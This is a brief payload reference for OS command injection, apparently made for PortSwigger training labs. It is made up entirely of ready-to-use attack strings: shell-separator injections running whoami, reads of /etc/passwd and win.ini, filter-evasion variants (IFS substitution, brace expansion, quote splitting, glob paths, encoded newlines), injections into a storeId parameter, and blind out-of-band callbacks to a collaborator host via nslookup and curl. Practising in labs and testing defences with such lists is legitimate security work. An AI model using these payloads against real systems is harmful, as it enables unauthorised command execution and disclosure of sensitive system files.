# OS Command Injection - Payload Reference

## Basic Injection
```
|whoami
;whoami
`whoami`
$(whoami)
||whoami
&&whoami
```

## With Output Capture
```
|cat /etc/passwd
;cat /etc/passwd
|type C:\windows\win.ini
```

## Bypass Filters

### Space Bypass
```
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat%09/etc/passwd        # Tab
```

### Command Bypass
```
w'h'o'am'i
w"h"o"am"i
/???/??t /???/p??s??     # Glob
```

### Semicolon Bypass
```
|whoami
%0awhoami                # Newline
%0d%0awhoami             # CRLF
```

## PortSwigger Lab Targets
```
storeId=1|whoami
storeId=1;whoami
storeId=1`whoami`
storeId=1$(whoami)
```

## Blind Techniques
```
|ping -c 10 127.0.0.1    # Time delay
|nslookup BURP_COLLAB    # OOB DNS
|curl http://BURP_COLLAB  # OOB HTTP
```
